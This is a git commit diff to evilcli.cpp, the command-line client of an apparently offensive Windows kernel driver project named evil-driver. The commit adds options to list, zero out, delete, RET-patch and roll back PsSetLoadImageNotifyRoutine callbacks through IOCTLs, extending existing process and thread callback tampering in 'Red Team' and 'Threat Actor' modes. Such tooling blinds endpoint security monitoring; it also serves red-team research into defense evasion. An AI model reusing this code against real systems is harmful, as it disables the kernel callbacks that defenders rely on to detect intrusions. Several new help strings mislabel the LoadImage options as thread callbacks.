57f23287571c0d56319b352dbbfc1afeb93075d2
Matteo Malvica <matteo@malvica.com>
2020-07-12 17:13:35 +0200

    Added support for PsSetLoadImageNotifyRoutine

--- evil-driver/evilcli/evilcli.cpp
+++ evil-driver/evilcli/evilcli.cpp
@@ -13,7 +13,7 @@ void Usage()
 	printf("Usage: evilcli.exe <options>\n");
 	printf("Options:\n");
 	printf("  -h\t\tShow this message.\n");
-	printf("  -l\t\tProcess & Thread Notify Callbacks Address's List.\n");
+	printf("  -l\t\tProcess, Thread & LoadImage Notify Callbacks Address's List.\n");
 	printf("<Process Callbacks>\n");
 	printf("  -zp\t\tZero out Process Notify Callback's Array (Cowboy Mode).\n");
 	printf("  -dp <index>\tDelete Specific Process Notify Callback (Red Team Mode).\n");
@@ -24,12 +24,21 @@ void Usage()
 	printf("  -dt <index>\tDelete Specific Thread Notify Callback (Red Team Mode).\n");
 	printf("  -pt <index>\tPatch Specific Thread Notify Callback (Threat Actor Mode).\n");
 	printf("  -rt <index>\tRollback to the original Thread Notify Callback (Thoughtful Ninja Mode).\n");
+	printf("<LoadImage Callbacks>\n");
+	printf("  -zl\t\tZero out Thread Notify Callback's Array (Cowboy Mode).\n");
+	printf("  -dl <index>\tDelete Specific Thread Notify Callback (Red Team Mode).\n");
+	printf("  -pl <index>\tPatch Specific Thread Notify Callback (Threat Actor Mode).\n");
+	printf("  -rl <index>\tRollback to the original Thread Notify Callback (Thoughtful Ninja Mode).\n");
 }
 
 void DisplayInfo(BYTE* buffer, DWORD size) {
 	auto count = size;
 	int index_comp = 0;
-	bool flag = 0;
+	int index_prev = 0;
+	int internal_counter = 0;
+	bool thread_flag = 0;
+	bool thread_flag_temp = 0;
+	bool loadimage_flag = 0;
 	while (count > 0)
 	{
 		auto index = *(ULONG64*)buffer;
@@ -41,9 +50,13 @@ void DisplayInfo(BYTE* buffer, DWORD size) {
 			
 		}
 
-		if ((flag == 0) & (index < index_comp)) {
+		if ((thread_flag == 0) & (index < index_comp)) {
 			printf("[*] Thread Callbacks\n");
-			flag = 1;
+			thread_flag = 1;
+		}
+
+		if ((index <= index_prev) & (loadimage_flag == 1)) {
+			printf("[*] LoadImage Callbacks\n");
 		}
 
 		printf("[%02llu] 0x%llx", index, addr);
@@ -58,8 +71,12 @@ void DisplayInfo(BYTE* buffer, DWORD size) {
 		printf(" (%s + 0x%llx)\n", ModuleName, ModuleBase);
 
 		count = count - 8 - 32;
+		index_comp ++;
+		index_prev = index;
 
-		index_comp++;
+		if (thread_flag == 1) {
+			loadimage_flag = 1;
+		}
 	
 	}
 }
@@ -95,6 +112,12 @@ int main(int argc, const char* argv[]) {
 		success = DeviceIoControl(hDevice, IOCTL_EVIL_THREAD_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
 	}
 
+	if (strcmp(argv[1], "-zl") == 0)
+	{
+		InputBuffer.remove = 1;
+		success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+	}
+
 	else if (strcmp(argv[1], "-m") == 0) // not in the help menu
 	{
 		success = DeviceIoControl(hDevice, IOCTL_EVIL_LIST_MODULES, nullptr, 0, &OutputBuffer, 0, &lpBytesReturned, nullptr);
@@ -127,6 +150,18 @@ int main(int argc, const char* argv[]) {
 			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
 	}
 
+	else if (strcmp(argv[1], "-pl") == 0)
+	{
+		InputBuffer.index = atoi(argv[2]);
+		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
+		{
+			printf("Patching index: %d with a RET (0xc3)\n", InputBuffer.index);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+		}
+		else
+			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
+	}
+
 	else if (strcmp(argv[1], "-rp") == 0)
 	{
 		InputBuffer.index = atoi(argv[2]);
@@ -146,6 +181,18 @@ int main(int argc, const char* argv[]) {
 		{
 			printf("Rolling back patched index: %d to the original values\n", InputBuffer.index);
 			success = DeviceIoControl(hDevice, IOCTL_EVIL_THREAD_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), nullptr, 0, &lpBytesReturned, nullptr);
+		}
+		else
+			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
+	}
+
+	else if (strcmp(argv[1], "-rl") == 0)
+	{
+		InputBuffer.index = atoi(argv[2]);
+		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
+		{
+			printf("Rolling back patched index: %d to the original values\n", InputBuffer.index);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), nullptr, 0, &lpBytesReturned, nullptr);
 		}
 		else
 			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
@@ -173,6 +220,18 @@ int main(int argc, const char* argv[]) {
 		}
 		else
 			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
+	}
+
+	else if (strcmp(argv[1], "-dl") == 0)
+	{
+	InputBuffer.index = atoi(argv[2]);
+	if (InputBuffer.index >= 0 && InputBuffer.index < 65)
+	{
+		printf("Removing index: %d\n", InputBuffer.index);
+		success = DeviceIoControl(hDevice, IOCTL_EVIL_LOADIMAGE_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+	}
+	else
+		printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
 	}
 
 
